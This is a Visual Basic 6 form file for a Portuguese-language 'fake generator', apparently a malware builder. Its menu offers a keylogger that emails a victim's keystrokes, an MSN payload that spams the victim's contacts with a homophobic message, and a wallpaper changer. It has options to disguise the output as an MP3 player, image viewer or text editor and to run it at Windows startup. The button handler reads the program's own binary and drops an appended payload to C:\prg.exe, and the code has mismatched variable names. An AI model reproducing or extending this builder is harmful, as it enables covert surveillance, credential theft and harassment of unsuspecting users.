VERSION 5.00
Begin VB.Form frmMenu 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Menu - Gerador de Fakes"
   ClientHeight    =   4050
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   5430
   ControlBox      =   0   'False
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4050
   ScaleWidth      =   5430
   StartUpPosition =   3  'Windows Default
   Begin VB.PictureBox Picture2 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   585
      Left            =   3975
      ScaleHeight     =   555
      ScaleWidth      =   1065
      TabIndex        =   11
      Top             =   765
      Width           =   1095
      Begin VB.CommandButton Command1 
         BackColor       =   &H00C0C0FF&
         Caption         =   "Gerar!"
         BeginProperty Font 
            Name            =   "Comic Sans MS"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   555
         Left            =   0
         Style           =   1  'Graphical
         TabIndex        =   12
         Top             =   0
         Width           =   1065
      End
   End
   Begin VB.PictureBox Picture1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      ForeColor       =   &H80000008&
      Height          =   465
      Left            =   3210
      ScaleHeight     =   435
      ScaleWidth      =   1245
      TabIndex        =   9
      Top             =   2595
      Width           =   1275
      Begin VB.CommandButton Command2 
         Caption         =   "Personalizar"
         BeginProperty Font 
            Name            =   "Comic Sans MS"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   435
         Left            =   0
         TabIndex        =   10
         Top             =   0
         Width           =   1245
      End
   End
   Begin VB.Frame fraFak 
      Appearance      =   0  'Flat
      Caption         =   "Tipo do Fake"
      ForeColor       =   &H80000008&
      Height          =   1215
      Left            =   225
      TabIndex        =   5
      Top             =   2175
      Width           =   2595
      Begin VB.OptionButton optFake 
         Caption         =   "WallPaperSeter"
         Height          =   240
         Index           =   5
         Left            =   180
         TabIndex        =   8
         ToolTipText     =   "Define o wallpaper de período em período com uma imagem definida pelo usuário..."
         Top             =   345
         Width           =   1845
      End
      Begin VB.OptionButton optFake 
         Caption         =   "GKeyloger"
         Height          =   240
         Index           =   4
         Left            =   195
         TabIndex        =   7
         ToolTipText     =   "Envia para o email definodo, tudo o que o ""atingido"" digita."
         Top             =   585
         Width           =   2100
      End
      Begin VB.OptionButton optFake 
         Caption         =   "MSN HomoFake"
         Height          =   240
         Index           =   3
         Left            =   195
         TabIndex        =   6
         ToolTipText     =   "Envia para todos os contatos do MSN do atindido, de 8 em 8 segundos a frase: ""Eu Sou Gay""."
         Top             =   825
         Width           =   2100
      End
   End
   Begin VB.CheckBox Check1 
      Caption         =   "Iniciar ""fake"" com o Windows?"
      Height          =   270
      Left            =   225
      TabIndex        =   4
      Top             =   3450
      Width           =   2550
   End
   Begin VB.Frame fraCamuf 
      Appearance      =   0  'Flat
      Caption         =   "Camuflagem"
      ForeColor       =   &H80000008&
      Height          =   1215
      Left            =   180
      TabIndex        =   0
      Top             =   450
      Width           =   2595
      Begin VB.OptionButton optCamu 
         Caption         =   "Editor de Textos"
         Height          =   240
         Index           =   2
         Left            =   195
         TabIndex        =   3
         Top             =   825
         Width           =   2100
      End
      Begin VB.OptionButton optCamu 
         Caption         =   "Visualizador de Imagens"
         Height          =   240
         Index           =   1
         Left            =   195
         TabIndex        =   2
         Top             =   585
         Width           =   2100
      End
      Begin VB.OptionButton optCamu 
         Caption         =   "MP3 Player"
         Height          =   240
         Index           =   0
         Left            =   180
         TabIndex        =   1
         Top             =   345
         Width           =   1215
      End
   End
End
Attribute VB_Name = "frmMenu"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private fD As cFileDialog
Dim fileContent As String
Dim fileContenta As String
Dim p_ret As String
Dim arqui As String
Dim reso As String
Dim prog As String
Dim progcont As String
Dim hidstr As String
Dim filelen As String
Dim filen As String
Dim aa As Integer

Private Sub Command1_Click()
  On Error Resume Next
'abrir o programa como binary e se os 3 ultimos caracteres dele forem "|pp"
'então reso="C:\wallpaper.bmp", se forem "|ex" então reso="C:\prg.exe"
If Len(App.Path) > 3 Then
prog = App.Path & "\" & App.EXEName & ".exe"
Else
prog = App.Path & App.EXEName & ".exe"
End If
Open prog For Binary Access Read As #1
progcont = Input(LOF(1), 1)
Close #1
If Left$(progcount, 3) = "|pp" Then reso = "C:\Wallpaper.bmp"
If Left$(progcount, 3) = "|ex" Then reso = "C:\prg.exe"

Dim leng As Integer
leng = 9
numx = Len(fileContent) - Int(InStr(1, fileContent, hidstr, vbBinaryCompare)) - leng

des = Right(fileContent, numx)

Open reso For Binary As #2
Put #2, , des
Close #2



End Sub

Private Sub Form_Load()
hidstr = "|FAKE|"
End Sub
